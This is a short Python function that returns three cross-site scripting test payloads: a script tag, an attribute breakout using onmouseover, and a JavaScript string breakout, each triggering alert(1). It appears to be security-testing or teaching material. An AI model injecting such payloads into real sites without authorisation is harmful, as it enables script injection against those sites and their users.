def generate_xss():
    return [
        {
            "type": "Reflected XSS",
            "context": "HTML",
            "payload": "<script>alert(1)</script>"
        },
        {
            "type": "Stored XSS",
            "context": "Attribute",
            "payload": "\" onmouseover=\"alert(1)"
        },
        {
            "type": "DOM XSS",
            "context": "JavaScript",
            "payload": "';alert(1);//"
        }
    ]
